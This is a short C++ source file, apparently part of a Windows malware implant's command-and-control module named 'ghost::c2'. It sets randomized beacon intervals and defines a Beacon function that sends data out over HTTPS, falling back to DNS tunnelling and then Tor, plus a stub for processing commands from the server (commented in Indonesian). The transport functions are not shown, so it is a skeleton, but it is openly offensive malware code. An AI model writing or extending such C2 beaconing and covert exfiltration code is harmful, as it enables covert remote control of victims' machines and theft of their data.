#include <Windows.h>
#include "c2.h"
#include "../core/config.h"

namespace ghost {
namespace c2 {

    uint32_t g_BeaconIntervalMin = config::BEACON_MIN;
    uint32_t g_BeaconIntervalMax = config::BEACON_MAX;

    bool Beacon(const uint8_t* data, size_t len) {
        if (SendHTTPS(data, len)) return true;
        if (SendDNSTunnel(data, len)) return true;
        return SendTOR(data, len);
    }

    void ProcessCommand(const uint8_t* data, size_t len) {
        // Di sini instruksi dari server diproses
        OutputDebugStringA("[C2] Command Received!\n");
    }

} // namespace c2
} // namespace ghost